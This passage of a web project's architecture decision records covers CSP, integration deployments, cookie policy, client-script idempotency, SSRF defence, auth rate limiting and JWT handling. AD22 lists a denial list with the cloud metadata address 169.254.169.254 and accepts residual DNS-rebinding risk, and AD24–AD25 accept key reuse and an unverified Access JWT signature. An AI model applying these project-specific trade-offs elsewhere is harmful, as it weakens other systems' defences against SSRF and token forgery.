- Attribute-leak attacks (`::before { content: attr(...) }` + URL load) are likewise blocked by `connect-src`.
- `frame-ancestors 'none'` blocks UI redress / clickjacking via injected styles.

Strict `script-src 'self'` is doing 95% of the XSS-prevention work. The marginal security gain from removing `'unsafe-inline'` on `style-src` does not justify replacing two well-understood, currently-shipping animation patterns with reimplementations on top of less-tested APIs. Many production sites run this exact combination (strict `script-src` + `'unsafe-inline'` style-src) deliberately.

**Consequences:**

- The CSP comment block in `src/middleware/security-headers.ts` documents `'unsafe-inline'` as required, and points at this ADR for the full reasoning.
- Any proposal to remove `'unsafe-inline'` from `style-src` MUST include a concrete alternative for FLIP and view-transition-name mutations. Dropping it has broken production three times already (see `hotfix/csp-style-unsafe-inline` history).
- If Astro ever ships native CSP support that handles runtime style mutations (e.g., via per-element nonces resolved at runtime), revisit this decision.
- `tests/e2e/csp-violation.spec.ts` continues to act as the merge gate for any CSP tightening - it subscribes to `securitypolicyviolation` events on a live `/digest` navigation and fails the build if any fire.

**Related requirements:** [REQ-OPS-003](../../sdd/observability.md#req-ops-003-content-security-policy-on-every-response), [CON-SEC-001](../../sdd/constraints.md#con-sec-001-strict-content-security-policy)

---

### AD12: Integration env: separate Cloudflare resources, manual trigger from develop, crons disabled

**Status:** Accepted (2026-04-25)

**Decision:** Stand up an integration deployment target on a distinct hostname (set per-fork via the `APP_URL` GitHub Environment variable on the `integration` environment) backed by fully isolated Cloudflare resources - D1, KV, queues all suffixed `-integration`. Deploys are manual-only via a dedicated GitHub Actions workflow (`.github/workflows/deploy-integration.yml`) that always pulls the current `develop` HEAD. Cron triggers are disabled on integration; the scrape pipeline runs only when the operator hits `/api/admin/force-refresh`. Worker secrets are sourced from repo-level GitHub Actions secrets via the `environment: integration` fallback.

**Context:** Major dependency bumps (Astro 5→6 was the trigger), schema migrations, CSP tightening, and animation rewrites had no live-edge proving ground before integration existed. The only path to a real-browser test was production, which meant either painful rollbacks (`hotfix/csp-style-unsafe-inline` history) or speculative testing on local dev that didn't catch view-transition / PWA / cron-driven regressions. Vibe-coding without a staging surface was costing rollback time.

**Alternatives considered:**

- **Branch-based auto-deploy** (push to `integration` branch → auto-deploy). Rejected: forces operator to maintain a parallel branch and remember to push it; rebase friction every time develop moves.
- **Same workflow with environment dropdown** (codeflare's pattern). Cleaner long-term but requires dropping `[env.integration]` wrangler.toml blocks for `--name` CLI overrides. Two-workflow shape was the lower-risk path to ship integration quickly; single-workflow refactor is a later cleanup.
- **Auto-deploy on every push to develop** (mirror production's gate-on-PR-Checks pattern). Rejected: develop receives many small commits during iteration. Auto-deploys would consume time-to-deploy and the operator would lose the "deliberately staged a coherent change to test" workflow.
- **Shared resources (one D1, one KV) across prod and integration**. Rejected: integration migrations would corrupt prod data; integration force-refresh would compete with prod scrape state.
- **Cron triggers enabled on integration**. Rejected: would consume Workers AI budget on every-four-hour scrape runs that nobody is watching, and integration's empty seed data isn't representative enough to be worth the cost.

**Rationale:** The integration env serves a single purpose: confidence on changes that have non-trivial blast radius if they break in prod. The operator-only manual trigger matches the actual workflow (a person deciding "this is risky, I want to see it live before main"). Resource isolation removes the data-corruption class of failure. Crons-off keeps the cost surface narrow.

**Consequences:**

- 2× Cloudflare resource provisioning. Negligible cost on the small-data tier (D1, KV, queues are pennies/month).
- Operator must remember to manually trigger. There's no automation enforcing "test on integration before merging to main"; that discipline is on the human.
- Per-env GitHub Environment scoping is in place (`environment: integration`) so any secret can later be overridden without touching workflow code (e.g., a separate `OAUTH_JWT_SECRET` to isolate cross-env JWT identity confusion).
- Integration's `APP_URL` is a GitHub Environment **variable** (not a secret, not hardcoded). Forks set their own hostname under Settings → Environments → integration → Variables → APP_URL without touching code.
- All Cloudflare resources are provisioned by inline `wrangler` lookup-or-create blocks in both deploy workflows. Resolved IDs are patched into a CI-only `wrangler.toml` copy at deploy time; forks need zero pre-deploy setup.

**Related requirements:** [REQ-OPS-006](../../sdd/observability.md#req-ops-006-integration-deployment-target)

---

### AD13: No non-essential cookies (analytics gate)

**Status:** Accepted (2026-05-04)

**Decision:** The product MUST NOT set non-essential cookies. The only cookies allowed are session-essential ones (auth session token, refresh token, theme preference, OAuth state, CSRF). Adding any analytics, marketing, fingerprinting, A/B-testing, or tracking cookie requires revisiting this ADR and updating the tagline copy.

**Context:** The landing-page tagline at `src/pages/index.astro:54-57` asserts that this product runs without cookie banners ("Where we're going, we don't need cookie banners…"). This is a load-bearing user-trust claim that an unrelated future analytics/marketing PR could silently violate, breaking the tagline contract and potentially creating a compliance liability under EU/Swiss cookie-consent regimes.

**Rationale:** The tagline is not a marketing flourish - it's a stated contract. Reviewing the no-cookies claim during every analytics-curious PR keeps the contract honest. Cookieless analytics options exist (server-side aggregation from Worker request logs, edge-aggregated counters in KV, on-page Web-Vitals reporting via `sendBeacon` without an identifier cookie) and should be preferred when telemetry is genuinely needed.

**Consequences:**
- Reviewing this ADR is a mandatory step on any PR adding `Set-Cookie` for non-auth purposes.
- Telemetry/analytics integrations must use cookieless approaches (aggregated edge logs, one-shot beacon to a first-party endpoint with no client-side identifier, etc.) or this ADR must be superseded with an explicit decision and a tagline-copy revision.
- Until `documentation/security.md` is bootstrapped, the cookie inventory is inline in this ADR set (AD8 covers session + refresh-token cookies; OAuth state and theme cookies at their issue sites). `security.md` consolidates them when written.

**Related requirements:** none (this is a product-trust contract, not a behavioral REQ).

---

### AD14: History-page perf-comparability test permanently skipped

**Status:** Accepted (2026-05-04)

**Overrides:** `skipped-test:REQ-READ-002`, `skipped-test:REQ-HIST-001`

**Decision:** The numeric perf-comparability test (history back-nav ≤ 1.6× digest back-nav, median of 3 samples) in `tests/e2e/view-transition.spec.ts` is permanently skipped. No expiry, no removal trigger.

**Context:** A perf assertion was added to verify that `/history` back-navigation rendered within 1.6× the time of `/digest` back-navigation. The test reproducibly failed because `/history` is structurally heavier - opened day-groups carry more cards and trigger more layout work than the flat digest list. Multiple attempts to close the gap (lazy-render hidden groups, virtualize the list, defer non-visible card hydration) either regressed visual behavior or didn't move the timing meaningfully. User-confirmed on 2026-04-28: "we leave it as is, enough trying to fix this."

**Rationale:** The structural REQ-READ-002 / REQ-HIST-001 contracts (single-named-group view-transition shaping, return-morph pair forms at `astro:after-swap`) remain covered by the non-skipped tests above the skip in the same file. The numeric perf gap is a property of the feature, not a regression. Keeping a permanently-skipped test costs nothing, and resurrecting it would require a future refactor to claim the gap is closed - at which point the test exists as a guard against re-regression.

**Consequences:**
- spec-reviewer skips the `it.skip` finding for this specific test via the `Overrides:` header above.
- If a future refactor intentionally narrows the perf gap, restore the test and update or remove this ADR.
- The skip line in `tests/e2e/view-transition.spec.ts` references this ADR rather than `sdd/.user-overrides.md` (which is being phased out per codeflare#266).

**Related requirements:** [REQ-READ-002](../../sdd/reading.md#req-read-002-article-detail-view-rendering), [REQ-HIST-001](../../sdd/history.md#req-hist-001-day-grouped-article-history)

---

### AD15: Test pool exercises worker.ts directly; production runs through the Astro-merged entry

**Status:** Accepted (2026-05-04)

**Decision:** Vitest's Workers pool loads `src/worker.ts` directly as the test entry. Production loads `dist/_worker.js/_merged.mjs` (the Astro-built bundle) per the `main` field in `wrangler.toml`. The two entry shapes are intentionally NOT unified.

**Context:** Astro 5's `@astrojs/cloudflare` adapter wraps the Worker in its own SSR-aware fetch handler that composes Astro middleware (security headers, view-transition support, asset routing) before delegating to the user-defined cron/queue handlers in `worker.ts`. Vitest cannot load the merged Astro entry because (a) the bundle is produced by `astro build`, which the test pool doesn't run, and (b) the merged file uses Astro-internal module shapes incompatible with `cloudflare:test`. So tests target `worker.ts` directly and exercise the cron/queue surface plus any HTTP routes that `worker.ts` defines inline. Cross-cutting middleware (e.g., the security-headers middleware in `src/middleware/security-headers.ts`) lives in Astro's wrapper and is bypassed in unit tests by construction.

**Alternatives considered:**

- **Force `npm run build` in the test pool setup.** Rejected: doubles CI wall-time on every test run, and the merged module shape is still incompatible with the Workers pool runtime.
- **Hand-roll a Worker entry composing Astro middleware.** Rejected: duplicates what `@astrojs/cloudflare` already does, churns on every Astro upgrade, and middleware is covered end-to-end by Playwright anyway.
- **Drop unit tests of cross-cutting middleware entirely.** Rejected: Playwright covers the integration path, but unit tests for individual middleware functions (origin check, rate limit, JWT verify) remain valuable and live in `tests/middleware/`.

**Rationale:** The production middleware chain is verified end-to-end by Playwright (`tests/e2e/csp-violation.spec.ts` and the new `tests/e2e/csp-policy.spec.ts` from D3 below). Unit tests cover middleware functions in isolation. The test/prod entry inversion is acceptable as long as the contract gate stays in Playwright, not in vitest.

**Consequences:**

- New cross-cutting middleware that needs to fire on every response MUST add a Playwright spec exercising it via real `fetch`. A vitest-only test against `worker.ts` will pass while the middleware is silently absent in production.
- The `src/worker.ts` `fetch` branch that exists for the test pool is dead code in production. Mark it with a comment so a future cleanup doesn't delete it on dead-code analysis grounds.
- Astro upgrades that change the wrapper's middleware composition (Astro 6's session-driver factory is the active example) require a Playwright run before merge to confirm middleware still fires.

**Related requirements:** [REQ-OPS-003](../../sdd/observability.md#req-ops-003-content-security-policy-on-every-response)

---

### AD16: Single-writer invariant for KV `sources:{tag}` enforced via centralised helper

**Status:** Accepted (2026-05-04)

**Decision:** Every write to `sources:{tag}` KV entries goes through `writeSourcesCache` in `src/lib/sources-cache.ts`. The helper canonicalises serialisation (explicit field order: `feeds` then `discovered_at`). The coordinator's eviction read-modify-write recheck uses the helper's `sourcesCacheRawEqual` companion as a strict byte-equality check; the single-writer invariant makes the fast path sufficient.

**Context:** The eviction pass in `applyEvictions` reads `sources:{tag}`, computes a surviving-feeds list, then re-reads the key right before writing to detect a concurrent discovery-cron write. KV has no conditional-put, so the recheck is the only race guard. Before this ADR, the recheck was a raw `latestRaw === raw` byte compare - correct ONLY because the two existing writers (`discovery.ts` success path, `discovery.ts` give-up path, and the coordinator's eviction path) all coincidentally serialised the same `{ feeds, discovered_at }` shape with the same field order via inline `JSON.stringify(...)`. A future writer using a different shape (different field order, additional fields, alternative codec) would have silently clobbered legitimate concurrent writes the recheck was meant to prevent. Same anti-pattern AD7 explicitly migrated away from for chunk-completion tracking.

**Alternatives considered:**

- **Move `sources:{tag}` to D1.** Stronger atomicity guarantee (the AD7 path) but requires a schema migration. Eviction write volume is bounded (few hundred tags × 4h cron), so KV eventual consistency is acceptable. Deferred; revisit if volume grows.
- **Per-write monotonic version counter (CAS-style).** Adds a column without strengthening the gate; `discovered_at` already conveys the monotonic signal but is not consulted in the byte-equal recheck because byte-equality already covers the contract. Rejected.
- **Structural-recheck fallback on `discovered_at`.** Rejected: two writers landing the same millisecond with different feed sets would be treated as equivalent, silently clobbering one write. Byte-equality under the single-writer invariant is the correct contract.
- **Trust the comment** ("byte-equal compare valid because JSON.stringify is sole writer"). This is what the previous code did. Reviewer churn confirmed comments don't enforce invariants - the invariant is one careless PR away from breaking.

**Rationale:** Centralising the writer is the cheapest way to make the byte-equal invariant load-bearing instead of comment-bearing. Once `writeSourcesCache` is the sole writer with a fixed serialisation, byte-equality is the right race signal: any byte divergence MUST be a different write, and the eviction recheck correctly bails.

**Consequences:**

- New code touching `sources:{tag}` MUST use `writeSourcesCache`. A direct `KV.put('sources:...', ...)` call is a code-review reject.
- The helper exposes a `readSourcesCache` companion with matching shape validation; reading paths should migrate as they're touched (no big-bang rewrite - too much surface, too little risk reduction).
- If the cache value shape ever needs to gain a field, both the helper's `serialize()` field order AND `sourcesCacheRawEqual`'s parse path update in lockstep. The structural recheck's reliance on `discovered_at` is documented inline.
- Future `sources:{tag}` migration to D1 supersedes this ADR. Until then, this is the contract.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence)

---

### AD17: Reject `dedupe-groups.ts` extraction

**Status:** Accepted (2026-05-04)

**Decision:** A prior review batch (PR #168) proposed extracting `normaliseDedupGroups` into a shared `~/lib/dedupe-groups.ts` module - the chunk consumer's variant lacked the within-group dedup that the finalize variant carried. Land the lighter consequence (use the finalize variant's logic in both call sites) without standing up a new module.

**Context:** The chunk consumer ran `normaliseDedupGroups` against LLM-emitted `dedup_groups: number[][]` to canonicalise the groups before clustering. The finalize consumer ran a near-identical helper that additionally ran a Set-based dedup within each group. The prior plan was to extract both into a shared module so both call sites used the stricter logic.

**Alternatives considered:**

- **Land the extraction.** Costs a new module, two import-site updates, and a behaviour change in the chunk consumer (gain within-group dedup). Behaviour change is benign but non-trivial to reason about.
- **No-op the divergence.** The chunk consumer's downstream gating (canonical-URL dedupe + cluster-by-canonical) already removes within-group duplicates before they reach D1, so the missing helper-level dedup is only a redundant-group annotation, not a data correctness issue.

**Rationale:** The chunk consumer's downstream gating makes within-group dedup at the helper level redundant. Spending review velocity on the extraction would yield a non-observable behaviour change. Recorded as an explicit decision so the next reviewer doesn't replay the proposal.

**Consequences:**

- The chunk consumer's `normaliseDedupGroups` stays as-is, slightly looser than the finalize variant. This is documented in the chunk consumer's source comment.
- If future canonical-URL dedup is loosened (e.g., a feature lets two canonical URLs survive within one cluster), revisit this decision and land the extraction.

**Related requirements:** [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-output-content-contract), [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract)

---

### AD18: Reject `deferred-candidates.ts`; chunk-overflow path stays log-only

**Status:** Accepted (2026-05-04)

**Decision:** When a coordinator tick produces more chunk candidates than `MAX_CHUNKS_PER_TICK`, the overflow is dropped with a `coordinator.candidates_dropped` log event. A prior review batch proposed persisting overflow candidates to a `deferred:{scrape_run_id}` KV row and re-merging them on the next tick. Defer indefinitely.

**Context:** `MAX_CHUNKS_PER_TICK` caps the number of chunks one coordinator tick can fan out, primarily to keep the per-tick LLM cost bounded. Today the cap is comfortable headroom (current observed peak is well under the cap). The "persist + re-merge" plan was speculative - protecting a failure mode that hasn't been observed in production.

**Alternatives considered:**

- **Persist overflow to KV with TTL.** Adds a new KV key prefix, a re-merge path on next tick, and an observability story for "deferred candidate fell out before re-merge". Worth implementing IF and WHEN the drop log fires non-trivially.
- **Raise `MAX_CHUNKS_PER_TICK`.** Trades drop frequency for tick wall-clock time and LLM cost. Same outcome long-term once observed.

**Rationale:** A speculative persistence layer is the wrong direction; until the drop log shows a real problem, the simpler path is to keep the cap and revisit the cap value (not the persistence story) when observability says we're truncating real candidates.

**Consequences:**

- `coordinator.candidates_dropped` event continues to surface drops in `wrangler tail`. Operators monitor this signal; if drops become sustained, raise the cap or implement the persistence layer at that point.
- This ADR documents WHY a `deferred-candidates.ts` module does not exist, so the next reviewer doesn't replay the proposal.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence)

---

### AD19: Reject `tag-railing-flip-core.ts`; FLIP measurements are not separable from DOM

**Status:** Accepted (2026-05-04)

**Decision:** A prior review batch proposed extracting the FLIP-cascade kernel from `src/lib/tag-railing-flip.ts` into a DOM-free `tag-railing-flip-core.ts` module so the math could be unit-tested in vitest. The math is genuinely intertwined with DOM measurement timing (`getBoundingClientRect` ordering, requestAnimationFrame phase, cascade staggering) and a pure-math kernel would only test the trivial parts. Tests live in Playwright E2E instead.

**Context:** FLIP (First-Last-Invert-Play) animations measure DOM rectangles before and after a layout-affecting mutation, then transform-translate the affected elements to their pre-layout positions and animate them back. The "math" is per-element delta computation; the load-bearing logic is the order in which measurements happen relative to the DOM mutation, the cascade stagger between sibling chips, and the lock-state transitions that prevent overlapping animations from clobbering each other. None of this is meaningfully testable without a real layout engine.

**Alternatives considered:**

- **Extract a kernel anyway.** Would test trivial deltas and miss the actual failure modes. False confidence.
- **Use a JSDOM-based vitest test pool.** JSDOM doesn't run a real layout engine; `getBoundingClientRect` returns zero. Same problem.
- **Keep behaviour in `tag-railing-flip.ts`, add Playwright spec that asserts the user-observable contract (lock clears, scrollLeft preserved, no CSP violations).** This is what `tests/e2e/tag-railing-flip.spec.ts` does (added in Phase F).

**Rationale:** The contract is "the chip cascade looks right and doesn't break under view-transitions or PWA scroll restoration." That's an end-to-end contract, not a kernel contract.

**Consequences:**

- `src/lib/tag-railing-flip.ts` stays as-is; the `?raw`-source-grep tests it spawned are deleted in Phase F (CF-011) and replaced by the Playwright spec.
- This ADR documents WHY a `tag-railing-flip-core.ts` module does not exist.

**Related requirements:** [REQ-READ-007](../../sdd/reading.md#req-read-007-tag-railing-reorder-animation), [REQ-READ-008](../../sdd/reading.md#req-read-008-tag-railing-scroll-wrap-and-fallback)

---

### AD20: Idempotency tokens for client scripts loaded BOTH as Pattern B IIFE AND via page-level import must live on `window`

**Status:** Accepted (2026-05-04)
**Overrides:** none - captures a regression-class so future review passes don't reintroduce it.

**Context:** Client scripts under `src/scripts/*.ts` ship two ways:

- **Pattern B** - compiled by `scripts/build-client-scripts.mjs` into a self-contained IIFE bundle at `public/scripts/<name>.js`, loaded layout-wide by a `<script type="module" src="/scripts/<name>.js">` tag in `src/layouts/Base.astro`. CSP `script-src 'self'` requires self-hosted modules; an inline `<script>` would be CSP-blocked.
- **Pattern A** - placed under `src/scripts/bundled/` and imported by an Astro component or page; Vite/Astro bundles them into a hashed `_astro/*.js` chunk per page that uses them.

`src/scripts/card-interactions.ts` is exclusively Pattern B (lives at the top level of `src/scripts/`, NOT under `bundled/`). However `src/pages/history.astro` ALSO statically imports `initCardInteractions` from this file so the page can re-bind tag-disclosure click handlers on cards CLONED into the search-filter grid (the layout-wide IIFE only fires on `astro:page-load`, not after JS-driven clone insertion). That static import causes Vite to bundle the *entire* module - including the auto-wire IIFE at the bottom - into history.astro's chunk. The result is **two independent module evaluations** of the same source on /history:

1. The standalone IIFE (Pattern B build) runs on script-tag load.
2. The Astro-bundled copy runs when history.astro's chunk evaluates.

Each evaluation has its own module-scope closure. Each closure has its own `let starDelegationBound = false`. Each registers its own `document.addEventListener('click', …)`. Two listeners fire per star click: the first flips `aria-pressed` and POSTs; the second sees the already-flipped state and DELETEs. Net effect: every favourite toggle silently reverts. The duplicate listener also persists on `document` across view-transitions, which is why the article-detail page's star button is broken when navigated FROM /history but works when navigated from /digest (whose pages don't import this module).

PRs #182, #184, and #185 all attacked this surface and missed the dual-bundle dimension:

- PR #182 stored the idempotency flag on `documentElement.dataset` - view-transition wipes it.
- PR #184 moved the flag into module-scope closure - only deduplicates within ONE module instance.
- PR #185 added a regression test for the documentElement-swap case but couldn't catch the cross-instance case because vitest evaluates the module once.

**Decision:** Idempotency tokens for any client script that is loaded both as Pattern B AND imported page-level MUST live on `window` - the realm-scoped global is the same object across both module evaluations. Module-scope closure variables and DOM-node datasets are insufficient. The pattern looks like:

```ts
declare global {
  // eslint-disable-next-line no-var
  var __cardInteractionsBound: { star?: true; outsideClick?: true } | undefined;
}
function getBindFlags() {
  if (typeof window === 'undefined') return {};
  if (window.__cardInteractionsBound === undefined) {
    window.__cardInteractionsBound = {};
  }
  return window.__cardInteractionsBound;
}
```

**Alternatives considered:**

- **Strip the page-level import; rely on the layout-wide auto-wire.** Closes the dual-bundle hole but removes synchronous clone rebinding. Requires exposing `initCardInteractions` on `window` or a custom event - both larger refactors than the chosen fix.
- **Move the auto-wire IIFE to `card-interactions-bootstrap.ts`.** Cleaner architecturally but ties Pattern B/A separation to a file-naming convention; a future importer who grabs the bootstrap by mistake re-introduces the bug.
- **`window`-scoped token (chosen).** Smallest diff, strongest guarantee, works regardless of how many copies of the module run.

**Consequences:**

- All future `src/scripts/*.ts` files that need to register global listeners AND might be imported by a page MUST use the window-scoped token pattern. The closure-flag pattern is a foot-gun.
- `scripts/check-no-page-pattern-b.mjs` is added as a CI gate: it scans Astro pages and components for static imports of top-level `src/scripts/*.ts` files. Any match fails the build with a pointer to this ADR. Scripts for page import must live under `src/scripts/bundled/`.
- The `__resetForTests` helper in `card-interactions.ts` clears `window.__cardInteractionsBound` instead of closure variables.

**Related requirements:** [REQ-STAR-001](../../sdd/reading.md#req-star-001), [REQ-READ-001](../../sdd/reading.md#req-read-001)

---

### AD21: Drop-cap vertical alignment is not portable across non-Charter serif fallbacks

**Status:** Accepted (2026-05-04)

**Context:** `src/pages/digest/[id]/[slug].astro` styles the article's lead paragraph with a `::first-letter` drop cap. The math (font-size 3.6em, line-height 1, margin-bottom -0.34em) was tuned for Charter - the preferred serif on Apple platforms - assuming an ascent ratio of ~0.78 and a cap-height ratio of ~0.66. On Linux and Windows, the `--font-serif` stack falls back to Source Serif Pro, Noto Serif, Cambria, or Times New Roman, which carry different metrics; the cap renders ~0.3em below where the math placed it.

PR #185 attempted to compensate with `margin-top: -0.3em`. The user reported this pulled the cap visibly above line 1's cap-top on the rendering platform and collided with line 2's leading. Reverted to `margin-top: 0` in PR #186.

**Decision:** Accept that the drop cap renders correctly on Charter (Apple) and acceptably (slightly below ideal cap-top) on the other fallbacks. Do NOT attempt CSS-only compensation; the metrics differ too much across fonts. A future improvement can detect the loaded font via `document.fonts.check('1em Charter')` and toggle a CSS variable for per-font tuning, but that is a feature, not a bug fix.

**Alternatives considered:**

- **Static `margin-top` value** - what PR #185 tried. Either fixes Charter at the cost of non-Charter, or vice versa. No single value works.
- **Use `initial-letter` CSS property** - comment in source notes that initial-letter has bug-prone implementations across browsers (Samsung Browser float-above-line-1 bug, etc.) and was deliberately abandoned in favour of float-based math.
- **Per-font CSS variable, set via JS feature-detect.** Correct long-term answer; out of scope for a bug-fix.

**Consequences:**

- Drop-cap looks slightly low on Linux/Windows browsers; this is the accepted state.
- The CSS comment block in `[slug].astro` notes the trap so the next reviewer doesn't try the same `margin-top` adjustment again.

**Related requirements:** [REQ-READ-002](../../sdd/reading.md#req-read-002)

---

### AD22: SSRF defence relies on Workers network sandbox; static IP allowlist is best-effort only

**Status:** Accepted (2026-05-05)

**Decision:** Accept the residual DNS-rebinding risk in the server-side article-body fetch path. Rely on the Cloudflare Workers network sandbox, which already blocks the meaningful exfiltration paths (private IP ranges, link-local, metadata endpoints) at the platform layer. Maintain the static hostname/IP denial list (including `metadata` and `169.254.169.254` literals) as defence in depth.

**Context:** `isUrlSafe()` in `src/lib/ssrf.ts` performs a static hostname/IP-literal check at request time. Between this check and the actual fetch, DNS resolution can flip (DNS rebinding) so that a hostname which passed validation later resolves to a private/loopback address. The Workers runtime, however, does not provide hooks to pin the resolved IP across the validation→fetch boundary. A bareword `metadata` hostname (no dot) is also not currently blocked by the existing literal list.

**Alternatives considered:**
- **Resolution pinning at the platform layer.** Would close the rebinding window entirely; not exposed by the Workers runtime today.
- **Outbound proxy with a curated egress allowlist.** Hard pin, but trades the SSRF surface for an availability dependency on the proxy, plus operational complexity that does not match the threat model.
- **Drop the static check entirely and rely solely on the platform sandbox.** Loses the defence-in-depth signal that a request asked for `169.254.169.254` literally - useful in logs even if the platform would have blocked the fetch anyway.

**Rationale:** Workers runtime sandbox already blocks the meaningful exfiltration paths. A static IP allowlist is best-effort defence-in-depth only; full DNS-rebinding mitigation requires runtime resolution pinning that the Workers platform does not expose. The cost of building a partial mitigation (e.g., a fetch wrapper that re-resolves immediately before fetch) does not justify the marginal risk reduction given the platform-level guarantees.

**Consequences:**
- SSRF defence is layered (static check + platform sandbox) rather than fully resolution-pinned.
- If Cloudflare ever loosens the runtime sandbox (e.g., allows outbound connections to RFC1918 ranges from a Worker), this decision MUST be revisited - the static check alone is not sufficient.
- Documented residual risk surfaces in `sdd/security.md` (or the equivalent threat-model doc when bootstrapped).
- The `metadata` bareword and any future single-label hostnames that resolve to sensitive infrastructure should be added to the literal denial list as they surface.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence) AC 8

---

### AD23: Auth-rate-limit fail-closed without WAF backstop

**Status:** Accepted (2026-05-05)

**Decision:** KV-backed auth rate limits (AUTH_LOGIN, AUTH_CALLBACK in `src/lib/rate-limit.ts`) fail CLOSED (`failClosed: true`) on KV error - auth requests are denied during a KV outage rather than admitted unrestricted. The Cloudflare WAF zone-level backstop is deliberately OUT OF SCOPE for this iteration.

**Context:** AUTH_LOGIN (10/min/IP) and AUTH_CALLBACK (20/min/IP) rate limits are enforced via KV counters. Two design choices arose: (a) what to do when KV itself is unavailable, and (b) whether to add a Cloudflare WAF zone-level backstop independent of KV. A WAF zone-level rate limit would be a hardware-layer backstop independent of KV.

**Alternatives considered:**
- **Fail-open on KV error.** Previous behaviour. Removes the auth rate limit on the OAuth code-exchange path during a KV outage - unacceptable given the brute-force exposure window.
- **Add a Cloudflare WAF zone-level rate-limit backstop in addition to fail-closed KV.** Stronger defence in depth; rejected for this iteration on cost/operational grounds (WAF rule maintenance, per-zone configuration drift across environments).
- **Move rate-limit counters to D1.** Stronger consistency than KV but introduces D1 write pressure on every auth request. Rejected as disproportionate to the threat.

**Rationale:** A WAF zone-level rate limit would be a hardware-layer backstop independent of KV. It is deliberately out of scope for this iteration: the cost/operational complexity of maintaining WAF rules is judged higher than the residual risk of relying solely on the KV-backed limit (which now fails closed). Failing closed during KV outages is preferred over silent removal of brute-force protection.

**Consequences:**
- Brief KV outages may surface as auth-login 429s for end users - preferred over silent removal of brute-force protection.
- No WAF rules are maintained, so the entire auth-throttle contract depends on the worker reaching KV. If a future incident shows this failure mode is operationally unacceptable, revisit by adding the WAF layer.
- The fail-closed flag is set per-rate-limiter and is auditable in source - any new rate limit added to the auth path MUST inherit `failClosed: true` and reference this ADR. An auth-path limiter without `failClosed: true` is a security regression, not a style preference: a KV outage on a fail-open auth limit silently removes the brute-force gate.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider), [REQ-AUTH-003](../../sdd/authentication.md#req-auth-003-csrf-defense-for-state-changing-endpoints)

---

### AD24: Single OAUTH_JWT_SECRET for both session signing and CSRF state

**Status:** Accepted (2026-05-05)

**Decision:** Deliberately reuse `OAUTH_JWT_SECRET` for both session JWT signing and CSRF-state HMAC. Do not derive a separate sub-key via HKDF. Both consumers run inside the same trust boundary; the threat model does not include attacks that disclose one purpose's key without the other.

**Context:** `verifyHmacSignature` (renamed from `timingSafeEqualHmac` in CF-014) in `src/lib/crypto.ts` is used for CSRF-state validation in OAuth callback handling (`src/pages/api/auth/[provider]/callback.ts:232`, `src/pages/api/dev/login.ts:70`, `src/pages/api/dev/trigger-scrape.ts:59`) and reuses `OAUTH_JWT_SECRET` - the same key that signs session JWTs. Standard cryptographic guidance is to derive distinct sub-keys per purpose via HKDF.

**Alternatives considered:**
- **HKDF-derive a separate sub-key per purpose** (`OAUTH_JWT_SECRET` → `session-signing-key` and `csrf-state-key` via HKDF-SHA256 with distinct `info` strings). Strict cryptographic best practice; rejected because the threat model does not justify the operational surface (key-derivation code path, cache, rotation semantics).
- **Introduce a separate `CSRF_STATE_SECRET` env var.** Doubles the rotation surface for the same trust boundary. Rejected.
- **Leave the API as-is and document only.** What was previously implicit. Rejected because the next reviewer reaches for HKDF-derive without reading this rationale.

**Rationale:** Both consumers run inside the same trust boundary (the worker) and the threat model does not include partial-secret-disclosure attacks where a session-signing key leaks but the CSRF-state key does not. Avoiding HKDF derivation keeps the key-management surface to a single rotated secret. Operational simplicity (one secret to rotate) outweighs the textbook key-separation principle given this threat model.

**Consequences:**
- Single secret to rotate (operational simplicity).
- If a partial-disclosure threat surfaces (e.g., a side-channel leaking the CSRF-state HMAC but not the JWT signing path), revisit this decision and introduce a HKDF-derived sub-key.
- The `verifyHmacSignature` rename (from `timingSafeEqualHmac`, CF-014) adopts a `(expected, candidate, secret)` convention that removes the misleading "argument-order is load-bearing" framing. Orthogonal to the key-reuse decision recorded here.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider), [REQ-AUTH-003](../../sdd/authentication.md#req-auth-003-csrf-defense-for-state-changing-endpoints)

---

### AD25: Cloudflare Access JWT signature unverified server-side; trust Access edge

**Status:** Superseded by AD29 (2026-05-05)

**Decision:** Rely on the platform guarantee that requests reaching the worker have already passed Cloudflare Access verification when `CF_ACCESS_AUD` is set. Skip in-worker JWT signature validation in `decodeAccessJwt` (`src/middleware/admin-auth.ts:49-68`).

**Context:** Admin endpoints are protected by Cloudflare Access. Requests arriving at the worker carry a `Cf-Access-Jwt-Assertion` header. The worker's `decodeAccessJwt` parses claims (`sub`, `email`, `aud`) without verifying the signature. Cloudflare Access verifies the JWT at the edge before requests reach the worker; re-verifying inside the worker (e.g., via JWKS) duplicates work without changing the security posture, provided the worker is properly bound to a custom domain with `workers_dev = false` and `CF_ACCESS_AUD` configured.

**Alternatives considered:**
- **JWKS-based signature verification inside the worker.** Strict defence-in-depth; requires fetching/caching Cloudflare's JWKS, periodic refresh, and key-rotation handling. Rejected as duplicative of the edge verification.
- **Drop the `aud` check and rely entirely on the edge.** Rejected - the `aud` check is a cheap deployment-misconfiguration tripwire that catches Access bound to the wrong application.
- **Verify signature only when `CF_ACCESS_AUD` is unset (fail-loud configuration error).** More complex than just refusing to start; rejected in favour of treating `CF_ACCESS_AUD` as a hard deployment requirement.

**Rationale:** Cloudflare Access verifies the JWT at the edge before requests reach the worker. Re-verifying inside the worker (e.g., via JWKS) duplicates work without changing the security posture, provided the worker is properly bound to a custom domain with `workers_dev = false` and `CF_ACCESS_AUD` configured. The deployment configuration itself is the security boundary - the alternative (in-worker JWKS verification) does not strengthen the posture if the deployment is correct, and does not save the deployment if it is misconfigured (an attacker reaching `*.workers.dev` directly would also have a fresh JWT-forging window if the audience check is the only gate).

**Consequences:**
- Operational deployment checklist must include: `CF_ACCESS_AUD` is set, `workers_dev = false`, and the Access policy is bound to the custom domain.
